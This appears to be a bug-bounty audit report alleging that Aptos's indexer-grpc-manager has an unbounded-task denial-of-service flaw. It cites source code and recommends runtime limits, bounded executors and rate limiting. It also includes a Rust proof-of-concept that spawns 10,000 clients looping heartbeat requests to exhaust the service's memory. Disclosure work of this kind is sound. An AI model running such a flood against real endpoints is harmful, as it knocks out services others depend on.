# Audit Report

## Title
Unbounded Task Spawning in Indexer gRPC Manager Enables Resource Exhaustion DoS

## Summary
The indexer-grpc-manager service uses the default `#[tokio::main]` runtime configuration without explicit limits on concurrent task spawning, blocking thread pools, or connection handling. This allows an attacker to exhaust system resources through unbounded task queue growth, causing service unavailability.

## Finding Description

The indexer-grpc-manager initializes its tokio runtime using the `#[tokio::main]` attribute macro with default settings [1](#0-0) , which creates an unbounded task queue without the protective limits used elsewhere in the Aptos codebase.

The Aptos production pattern for critical services uses `spawn_named_runtime()` which explicitly sets `max_blocking_threads(64)` and calls `disable_lifo_slot()` [2](#0-1) .

The indexer-grpc-manager spawns multiple unbounded task groups:

1. **MetadataManager polling loop** spawns tasks for each connected fullnode, grpc manager, and data service without limits [3](#0-2) 

2. **Tonic gRPC server** accepts incoming connections and spawns tasks per request [4](#0-3) 

3. **No BoundedExecutor or rate limiting** is applied, unlike critical Aptos components (consensus, mempool) which use bounded executors with explicit capacity limits [5](#0-4) 

**Attack Scenario:**
1. Attacker establishes many concurrent gRPC connections to the indexer-grpc-manager's listen address
2. Each connection sends repeated `heartbeat()`, `get_transactions()`, or `get_data_service_for_request()` calls [6](#0-5) 
3. The unbounded tokio task queue grows without limit as each request spawns a new task
4. Memory consumption increases linearly with concurrent requests (each task holds stack space and request state)
5. Eventually, the system exhausts available memory or becomes unresponsive due to task scheduler thrashing

## Impact Explanation

This qualifies as **High Severity** under the bug bounty program category "API crashes" because the indexer-grpc-manager is a critical API service that external systems rely on for querying blockchain data. The vulnerability causes service unavailability without requiring privileged access.

While the indexer is not a consensus component, its unavailability impacts the broader Aptos ecosystem by preventing applications from accessing historical transaction data and real-time blockchain state.

## Likelihood Explanation

**Likelihood: High**

The attack requires no authentication or privileged access. Any network peer can connect to the publicly exposed gRPC endpoint and send requests. The tokio default configuration (unbounded task queue) combined with no concurrent connection limits makes exploitation trivial. An attacker needs only basic gRPC client capabilities and sufficient network bandwidth to flood the service with requests.

## Recommendation

Apply the same runtime configuration pattern used by other Aptos production services:

1. Replace `#[tokio::main]` with an explicit tokio runtime builder:
```rust
fn main() -> Result<()> {
    let runtime = aptos_runtimes::spawn_named_runtime(
        "indexer-grpc-mgr".to_string(),
        Some(num_cpus::get())
    );
    runtime.block_on(async_main())
}

async fn async_main() -> Result<()> {
    let args = ServerArgs::parse();
    args.run::<IndexerGrpcManagerConfig>().await
}
```

2. Add a `BoundedExecutor` wrapper for gRPC request handling to limit concurrent requests

3. Configure tonic Server with explicit connection/stream limits

4. Add rate limiting for incoming connections using the existing `aptos-rate-limiter` crate

## Proof of Concept

```rust
// PoC demonstrating unbounded task spawning exploitation
use tonic::transport::Channel;
use aptos_protos::indexer::v1::grpc_manager_client::GrpcManagerClient;
use aptos_protos::indexer::v1::HeartbeatRequest;

#[tokio::main]
async fn main() {
    let target = "http://[manager-address]:8080";
    let mut handles = vec![];
    
    // Spawn 10,000 concurrent clients
    for _ in 0..10_000 {
        let target = target.to_string();
        let handle = tokio::spawn(async move {
            let channel = Channel::from_shared(target).unwrap().connect().await.unwrap();
            let mut client = GrpcManagerClient::new(channel);
            
            // Send repeated requests to exhaust task queue
            loop {
                let _ = client.heartbeat(HeartbeatRequest::default()).await;
                tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
            }
        });
        handles.push(handle);
    }
    
    // Monitor memory usage - will grow unbounded until OOM
    futures::future::join_all(handles).await;
}
```

The PoC demonstrates that each concurrent client spawns tasks on the unbounded queue, causing linear memory growth. Production monitoring would show increasing task counts, memory pressure, and eventual service unresponsiveness.

## Notes

This vulnerability is specific to the indexer-grpc-manager's runtime configuration. Other Aptos indexer-grpc services (data-service, file-store, gateway) share the same `#[tokio::main]` pattern and are similarly vulnerable. The fix should be applied consistently across all indexer-grpc services to maintain uniform security posture.

The issue is distinct from network-level DoS (which is out of scope) because it exploits an application-level configuration bug rather than protocol-layer flooding. The vulnerability exists regardless of network infrastructure protections.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/main.rs (L13-16)
```rust
#[tokio::main]
async fn main() -> Result<()> {
    let args = ServerArgs::parse();
    args.run::<IndexerGrpcManagerConfig>().await
```

**File:** crates/aptos-runtimes/src/lib.rs (L27-54)
```rust
    const MAX_BLOCKING_THREADS: usize = 64;

    // Verify the given name has an appropriate length
    if thread_name.len() > MAX_THREAD_NAME_LENGTH {
        panic!(
            "The given runtime thread name is too long! Max length: {}, given name: {}",
            MAX_THREAD_NAME_LENGTH, thread_name
        );
    }

    // Create the runtime builder
    let atomic_id = AtomicUsize::new(0);
    let thread_name_clone = thread_name.clone();
    let mut builder = Builder::new_multi_thread();
    builder
        .thread_name_fn(move || {
            let id = atomic_id.fetch_add(1, Ordering::SeqCst);
            format!("{}-{}", thread_name_clone, id)
        })
        .on_thread_start(on_thread_start)
        .disable_lifo_slot()
        // Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many
        // Rest API calls overwhelm the node.
        .max_blocking_threads(MAX_BLOCKING_THREADS)
        .enable_all();
    if let Some(num_worker_threads) = num_worker_threads {
        builder.worker_threads(num_worker_threads);
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L182-290)
```rust
            tokio_scoped::scope(|s| {
                for kv in &self.grpc_managers {
                    let address = kv.key().clone();
                    let grpc_manager = kv.value();
                    let client = grpc_manager.client.clone();
                    s.spawn(async move {
                        if let Err(e) = self.heartbeat(client).await {
                            warn!("Failed to send heartbeat to other grpc manager ({address}): {e:?}.");
                        } else {
                            trace!("Successfully sent heartbeat to other grpc manager ({address}).");
                        }
                    });
                }

                for kv in &self.fullnodes {
                    let (address, fullnode) = kv.pair();
                    let need_ping = fullnode.recent_states.back().is_none_or(|s| {
                        Self::is_stale_timestamp(
                            s.timestamp.unwrap_or_default(),
                            Duration::from_secs(1),
                        )
                    });
                    if need_ping {
                        let address = address.clone();
                        let client = fullnode.client.clone();
                        s.spawn(async move {
                            if let Err(e) = self.ping_fullnode(address.clone(), client).await {
                                warn!("Failed to ping FN ({address}): {e:?}.");
                            } else {
                                trace!("Successfully pinged FN ({address}).");
                            }
                        });
                    }
                }

                for kv in &self.live_data_services {
                    let (address, live_data_service) = kv.pair();
                    let unreachable = live_data_service.recent_states.back().is_some_and(|s| {
                        Self::is_stale_timestamp(
                            s.timestamp.unwrap_or_default(),
                            Duration::from_secs(60),
                        )
                    });
                    if unreachable {
                        unreachable_live_data_services.push(address.clone());
                        continue;
                    }
                    let need_ping = live_data_service.recent_states.back().is_none_or(|s| {
                        Self::is_stale_timestamp(
                            s.timestamp.unwrap_or_default(),
                            Duration::from_secs(5),
                        )
                    });
                    if need_ping {
                        let address = address.clone();
                        let client = live_data_service.client.clone();
                        s.spawn(async move {
                            if let Err(e) =
                                self.ping_live_data_service(address.clone(), client).await
                            {
                                warn!("Failed to ping live data service ({address}): {e:?}.");
                            } else {
                                trace!("Successfully pinged live data service ({address}).");
                            }
                        });
                    }
                }

                for kv in &self.historical_data_services {
                    let (address, historical_data_service) = kv.pair();
                    let unreachable =
                        historical_data_service
                            .recent_states
                            .back()
                            .is_some_and(|s| {
                                Self::is_stale_timestamp(
                                    s.timestamp.unwrap_or_default(),
                                    Duration::from_secs(60),
                                )
                            });
                    if unreachable {
                        unreachable_historical_data_services.push(address.clone());
                        continue;
                    }
                    let need_ping = historical_data_service
                        .recent_states
                        .back()
                        .is_none_or(|s| {
                            Self::is_stale_timestamp(
                                s.timestamp.unwrap_or_default(),
                                Duration::from_secs(5),
                            )
                        });
                    if need_ping {
                        let address = address.clone();
                        let client = historical_data_service.client.clone();
                        s.spawn(async move {
                            if let Err(e) = self
                                .ping_historical_data_service(address.clone(), client)
                                .await
                            {
                                warn!("Failed to ping historical data service ({address}): {e:?}.");
                            } else {
                                trace!("Successfully pinged historical data service ({address}).");
                            }
                        });
                    }
                }
            });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L101-125)
```rust
        let server = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
            .add_service(service);

        let (tx, rx) = channel();
        tokio_scoped::scope(|s| {
            s.spawn(async move {
                self.metadata_manager.start().await.unwrap();
            });
            s.spawn(async move { self.data_manager.start(self.is_master, rx).await });
            if self.is_master {
                s.spawn(async move {
                    self.file_store_uploader
                        .lock()
                        .await
                        .start(self.data_manager.clone(), tx)
                        .await
                        .unwrap();
                });
            }
            s.spawn(async move {
                info!("Starting GrpcManager at {}.", service_config.listen_address);
                server.serve(service_config.listen_address).await.unwrap();
            });
```

**File:** crates/bounded-executor/src/executor.rs (L22-31)
```rust
impl BoundedExecutor {
    /// Create a new `BoundedExecutor` from an existing tokio [`Handle`]
    /// with a maximum concurrent task capacity of `capacity`.
    pub fn new(capacity: usize, executor: Handle) -> Self {
        let semaphore = Arc::new(Semaphore::new(capacity));
        Self {
            semaphore,
            executor,
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L108-146)
```rust
#[tonic::async_trait]
impl GrpcManager for GrpcManagerService {
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }

    async fn get_transactions(
        &self,
        request: Request<GetTransactionsRequest>,
    ) -> Result<Response<TransactionsResponse>, Status> {
        let request = request.into_inner();
        let transactions = self
            .data_manager
            .get_transactions(request.starting_version(), MAX_SIZE_BYTES_FROM_CACHE)
            .await
            .map_err(|e| Status::internal(format!("{e}")))?;

        Ok(Response::new(TransactionsResponse {
            transactions,
            chain_id: Some(self.chain_id),
            // Not used.
            processed_range: None,
        }))
    }
```
